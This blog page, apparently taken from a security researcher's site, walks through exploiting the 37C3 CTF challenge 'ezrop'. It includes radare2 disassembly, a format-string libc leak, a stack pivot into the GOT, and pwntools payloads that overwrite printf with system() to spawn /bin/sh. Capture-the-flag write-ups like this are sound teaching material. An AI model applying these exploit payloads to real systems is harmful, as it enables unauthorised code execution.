@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+     
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>37C3 CTF: ezrop</title>
+    <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+
+ 
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/python.min.js"></script> 
+<script src="/js/cpp.min.js"></script> 
+<script src="/js/json.min.js"></script> 
+<script src="/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
+
+
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.119.0">
+    
+
+    
+</head>
+
+
+
+
+<body>
+     
+    <nav class="navbar navbar-default navbar-fixed-top">
+
+        <div class="container">
+
+            <div class="navbar-header">
+
+                <a class="navbar-brand visible-xs" href="#">37C3 CTF: ezrop</a>
+
+                <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+
+            </div>
+
+            <div class="collapse navbar-collapse">
+
+                
+                <ul class="nav navbar-nav">
+                    
+                    <li><a href="/">Home</a></li>
+                    
+                    <li><a href="/post/">Posts</a></li>
+                    
+                    <li><a href="/project/">Projects</a></li>
+                    
+                    <li><a href="/recipe/">Recipes</a></li>
+                    
+                </ul>
+                
+
+                
+                <ul class="nav navbar-nav navbar-right">
+                    
+                    <li class="navbar-icon"><a href="mailto:banana-#@#-bananamafia.dev"><i class="fa fa-envelope-o"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href=""><i class="fa fa-toggle-off"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=ao2GL3NAWQU"><i class="fa fa-envira"></i></a></li>
+                    
+                </ul>
+                
+
+            </div>
+
+        </div>
+
+    </nav>
+
+
+    <script>
+        
+        
+        
+
+        
+        $(".fa-toggle-off, .fa-toggle-on").parent().removeAttr("href");
+
+        
+        window.onload = setMode();
+
+        function isLightMode() {
+
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+
+            if (currentTheme == "light" || currentTheme == null) {
+                return true;
+            }
+            else {
+                return false;
+            }
+        }
+
+        function setMode() {
+            if (isLightMode()) {
+                setLight();
+            }
+            else {
+                setDark();
+            }
+        }
+
+        function setDark() {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            localStorage.setItem('bananamafia_theme', 'dark');
+
+            $(".fa-toggle-off").each(function (i) {
+                $(this).removeClass("fa-toggle-off");
+                $(this).addClass("fa-toggle-on");
+            });
+            setAltImgs();
+        }
+
+        function setLight() {
+            document.documentElement.setAttribute('data-theme', 'light');
+            localStorage.setItem('bananamafia_theme', 'light');
+
+            $(".fa-toggle-on").each(function (i) {
+                $(this).removeClass("fa-toggle-on");
+                $(this).addClass("fa-toggle-off");
+            });
+            setAltImgs();
+        }
+
+        function setAltImgs() {
+            var lightMode = isLightMode();
+            $(".alt-img").each(function (idx) {
+                if (lightMode) {
+                    
+                    var newSrc = $(this).attr("src").replace("_dark", "");
+                }
+                else {
+                    
+                    var imgExt = $(this).attr("src").split(".").pop();
+                    var newSrc = $(this).attr("src").substr(0, $(this).attr("src").lastIndexOf(".")) + "_dark." + imgExt;
+                }
+
+                $(this).fadeOut(250, function () {
+                    $(this).attr("src", newSrc);
+                });
+                $(this).fadeIn(250);
+            });
+        }
+
+        $(".fa-toggle-off, .fa-toggle-on").on("click", function () {
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+            $("body").addClass("transition-bg");
+            $("nav").addClass("transition-bg");
+            if (currentTheme == "dark") {
+                setLight();
+            } else {
+                setDark();
+            }
+
+            setTimeout(function () {
+                $("body").removeClass("transition-bg");
+                $("nav").removeClass("transition-bg");
+            }, 500);
+
+        });
+
+        $(document).ready(function () {
+            
+            $(".fa-envira").parent().mouseenter(function () {
+                confetti.reset();
+
+                confetti({
+                    useWorker: true,
+                    particleCount: 200,
+                    angle: 90,
+                    spread: 70,
+                    origin: {
+                        x: 0.5, y: 1
+                    },
+                    startVelocity: 60
+                });
+            });
+            setAltImgs();
+        });
+    </script>
+
+
+<main id="main">
+
+    <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/37c3ctf/">37C3 CTF: ezrop</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/rop"><kbd class="item-tag">rop</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify"><center>
+<img style="--img-shadow: rgba(0, 0, 0, 0)" src="/img/37c3ctf/logo.png">
+</center>
+<hr>
+<p>This is a writeup for the 37C3 CTF challenge <code>ezrop</code> with the following description: <code>Pretty standard ret2libc pwn challenge.</code>. A binary with partial RELRO, no PIC and no canary was given, along with the <code>libc</code> that&rsquo;s deployed on the target server. This writeup shows how to solve the challenge using <code>r2</code> and <a href="https://github.com/ps1337/pwntools-r2">pwntools-r2</a>.</p>
+<p>Triggering the buffer overflow vulnerability is straight forward: Passing a long string causes a segmentation fault in the function <code>vuln()</code>. This function calls <code>printf()</code> for a prompt and then proceeds to read input using <code>gets()</code> into a buffer that&rsquo;s too small. Next, an information leak of a <code>libc</code> address is required to move forward. Only few ROP gadgets exist and the plan is to somehow call <code>system()</code> with <code>/bin/sh</code> as argument. To predict the address of <code>system()</code>, the information leak is required.</p>
+<p>For such an information leak, you can use something like the ret2plt technique, which essentially calls <code>printf@PLT(printf@GOT)</code> (see <a href="https://bananamafia.dev/post/rop-arm-1/">here</a> for a post on this topic). This causes the program to print the address of <code>printf@GOT()</code>, which is a <code>libc</code> address. Existing code in the <code>vuln()</code> function can be recycled for something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x00401090</span>]<span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#66d9ef">s</span> <span style="color:#66d9ef">sym.vuln</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x004011db</span>]<span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#66d9ef">pd</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">;-- vuln:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011db</span>      <span style="color:#66d9ef">f30f1efa</span>       <span style="color:#66d9ef">endbr64</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011df</span>      <span style="color:#ae81ff">55</span>             <span style="color:#66d9ef">push</span> <span style="color:#66d9ef">rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011e0</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">e5</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011e3</span>      <span style="color:#ae81ff">4883</span><span style="color:#66d9ef">ec20</span>       <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011e7</span>      <span style="color:#ae81ff">488</span><span style="color:#66d9ef">d05160e00.</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">str.Enter_your_name</span>:<span style="color:#66d9ef">_</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011ee</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">c7</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">&lt;</span>------
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011f1</span>      <span style="color:#66d9ef">b800000000</span>     <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011f6</span>      <span style="color:#66d9ef">e865feffff</span>     <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.imp.printf</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011fb</span>      <span style="color:#ae81ff">488</span><span style="color:#66d9ef">d45e0</span>       <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span> - <span style="color:#ae81ff">0x20</span>]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011ff</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">c7</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00401202</span>      <span style="color:#66d9ef">b800000000</span>     <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00401207</span>      <span style="color:#66d9ef">e864feffff</span>     <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.imp.gets</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040120c</span>      <span style="color:#ae81ff">90</span>             <span style="color:#66d9ef">nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040120d</span>      <span style="color:#66d9ef">c9</span>             <span style="color:#66d9ef">leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040120e</span>      <span style="color:#66d9ef">c3</span>             <span style="color:#66d9ef">ret</span>
+</span></span></code></pre></div><p>At <code>0x4011ee</code>, we control the data referenced by the <code>RAX</code> register. This means that a call to <code>printf()</code> can be made with an attacker-controlled format string, since this is the first parameter. With a correct format string, the <code>printf()</code> function will then print the contents of the <code>RSI</code> register, which holds a <code>libc</code> address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%llx----&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75715e"># format string and padding</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;GGGGGAAFAAGAAHAAIAAJAAKA&#34;</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#  padding</span>
+</span></span><span style="display:flex;"><span>    p64(e<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> <span style="color:#75715e"># new rbp (for gets() after printf())</span>
+</span></span><span style="display:flex;"><span>    p64(<span style="color:#ae81ff">0x4011ee</span>) <span style="color:#75715e"># RIP, prepare RDI and printf()</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>The leaked value can then be used to calculate the offset to the start of the <code>libc</code> by subtracting the static offset <code>0x1d8963</code>. This offset was obtained by checking the leaked address and the start of <code>libc</code> using a debugger.</p>
+<p>The next challenge is to keep the process running after the <code>printf()</code> call, since we have to re-exploit it after the leak took place. As can be seen in the ASM listing above, <code>gets()</code> will be called directly after triggering the information leak. This call can be used to supply the second payload. However, since the stack was smashed, a writable destination for the buffer written by <code>gets()</code> has to be determined and supplied first. We control this value using our input, as can be seen at <code>0x4011fb</code>.</p>
+<p>Checking the process for writable locations shows that the only candidate is the GOT, which resides at a static location:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0040120f</span>]<span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#66d9ef">dm</span><span style="color:#960050;background-color:#1e0010">~</span><span style="color:#66d9ef">rw-</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000404000</span> - <span style="color:#ae81ff">0x0000000000405000</span> - <span style="color:#66d9ef">usr</span>     <span style="color:#ae81ff">4</span><span style="color:#66d9ef">K</span> <span style="color:#66d9ef">s</span> <span style="color:#66d9ef">rw-</span> [...]<span style="color:#960050;background-color:#1e0010">/</span><span style="color:#66d9ef">ezrop</span> <span style="color:#75715e">; obj._GLOBAL_OFFSET_TABLE_
+</span></span></span></code></pre></div><p>In this case, the GOT is writable since only partial RELRO is enabled. The location has a size of 4k, which is much more than the program actually needs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x0040120f</span>]<span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#66d9ef">pxq@0x404000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404000</span>  <span style="color:#ae81ff">0x0000000000403e20</span>  <span style="color:#ae81ff">0x00007f003e3042d0</span>    <span style="color:#960050;background-color:#1e0010">&gt;@</span><span style="color:#66d9ef">......B0</span><span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#66d9ef">....</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404010</span>  <span style="color:#ae81ff">0x00007f003e2e2ae0</span>  <span style="color:#ae81ff">0x0000000000401030</span>   .*.<span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#66d9ef">....0.@.....</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404020</span>  <span style="color:#ae81ff">0x0000000000401040</span>  <span style="color:#ae81ff">0x0000000000401050</span>   <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">.@.....P.@.....</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404030</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404040</span>  <span style="color:#ae81ff">0x00007f003e2855c0</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">.U</span>(<span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#66d9ef">............</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404050</span>  <span style="color:#ae81ff">0x00007f003e2848e0</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">.H</span>(<span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#66d9ef">............</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404060</span>  <span style="color:#ae81ff">0x00007f003e2854e0</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">.T</span>(<span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#66d9ef">............</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404070</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404080</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00404090</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004040a0</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004040b0</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004040c0</span>  <span style="color:#ae81ff">0x0000000000000000</span>  <span style="color:#ae81ff">0x0000000000000000</span>   <span style="color:#66d9ef">................</span>
+</span></span></code></pre></div><p>We chose <code>0x404008</code> (<code>got['printf']</code>) as new destination for the second ROP chain. Note that <code>0x10</code> is subtracted somewhere in the program, so we added <code>0x10</code>.</p>
+<p>There&rsquo;s enough space in the GOT to hold the second payload. However, the existing values in the GOT have to be kept intact or the program will crash. With the leaked <code>libc</code> base address, it&rsquo;s possible to pre-calculate the values which will be overwritten by the second payload. This means that the GOT entries remain untouched, while the second stage payload is being placed directly after the last GOT entry. We only change one GOT entry: The address of the <code>printf()</code> function with the goal to change it to the address of <code>system()</code>. Therefore, next time <code>printf()</code> gets called, execution jumps to <code>system()</code> instead and we win.</p>
+<p>After the second <code>puts()</code> call, <code>RSP</code> holds the value <code>0x404030</code>, which we control. However, the next gadget is located at  <code>0x4046f8</code>, so a <code>leave</code> gadget has to be utilized before calling any other gadget first. This ultimately leads to <code>RBP</code> (<code>0x4046f0</code>) being placed into <code>RSP</code>, which is important for the ROP chain execution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1337</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(libc_system) <span style="color:#f92672">+</span>  <span style="color:#75715e"># overwrite printf() GOT entry</span>
+</span></span><span style="display:flex;"><span>           p64(libc_gets) <span style="color:#f92672">+</span>  <span style="color:#75715e"># keep value</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x4046f0</span>) <span style="color:#f92672">+</span>  <span style="color:#75715e"># second ROP chain location (in GOT, is writable)</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x40120d</span>) <span style="color:#f92672">+</span>  <span style="color:#75715e"># leave; ret; (RBP becomes RSP)</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x1337</span>) <span style="color:#f92672">+</span> p64(libc_stdout) <span style="color:#f92672">+</span>  <span style="color:#75715e"># keep value</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x1337</span>) <span style="color:#f92672">+</span> p64(libc_stdin) <span style="color:#f92672">+</span>  <span style="color:#75715e"># keep value</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x1337</span>) <span style="color:#f92672">+</span> p64(libc_stderr) <span style="color:#f92672">+</span>  <span style="color:#75715e"># keep value</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x1337</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">210</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x4011ee</span>)  <span style="color:#75715e"># prepare RDI and printf()</span>
+</span></span></code></pre></div><p>After the <code>leave; ret;</code> instructions at <code>0x40120d</code>, <code>RSP</code> points to <code>0x4046f8</code>, where the <code>printf()</code> gadget (<code>0x4011ee</code>) is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011ee</span>      <span style="color:#ae81ff">4889</span><span style="color:#66d9ef">c7</span>         <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011f1</span>      <span style="color:#66d9ef">b800000000</span>     <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x004011f6</span>      <span style="color:#66d9ef">e865feffff</span>     <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.imp.printf</span> (<span style="color:#66d9ef">aka</span> <span style="color:#66d9ef">system</span>)
+</span></span></code></pre></div><p>Then, <code>RAX</code> points to the start of our payload (<code>/bin/sh\x00</code>), so finally <code>system()</code> can be called:</p>
+<center>
+<img width="60%" src="/img/37c3ctf/yolo.gif">
+</center></div>
+
+    
+    
+
+    
+
+    <h4 id="related" class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/binarygolf23/">BinaryGolf 2023: Building A GameBoy-Bash Polyglot</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/binary"><kbd class="item-tag">binary</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/satisfyer/">Analysis of Satisfyer Toys: Discovering an Authentication Bypass with r2 and Frida</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2frida"><kbd class="item-tag">r2frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/web"><kbd class="item-tag">web</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/tex/">Command Injection in LaTeX Workshop</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+</main>
+<footer id="footer">
+    <img style="width:42vh" src="/img/tag.png" class="alt-img" id="mafia-tag">
+
+    <p class="copyright text-muted">
+
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+<script>
+    var footerWidth = 200;
+    $(document).ready(function () {
+        setWidth();
+        $(window).bind("resize", setWidth);
+    });
+
+    $(window).on('load', function () {
+        setWidth();
+    });
+
+    function setWidth() {
+        footerWidth = $("main").width();
+
+        $("#footer").css("min-width", (footerWidth > 300 ? footerWidth : 300) + "px");
+        
+    }
+
+    $(window).on('resize', function () {
+        setWidth();
+    });
+
+</script>
+
+</html>
+
+
+<script>
+    var width = 200;
+    $(document).ready(function () {
+        setMaxWidth();
+        $(window).bind("resize", setMaxWidth);
+    });
+
+
+    function setMaxWidth() {
+        $("pre > code").css("display", "none");
+        $("pre").css("display", "none");
+
+        width = $("#related").width();
+
+        $("pre > code").css("display", "block");
+        $("pre").css("display", "block");
+
+        $("pre > code").css("maxWidth", (width) + "px");
+        $("pre").css("maxWidth", (width) + "px");
+    }
+
+    $(window).on('resize', function () {
+        setMaxWidth();
+    });
+
+    $(window).on('load', function () {
+        setMaxWidth();
+    });
+
+
+
+</script>
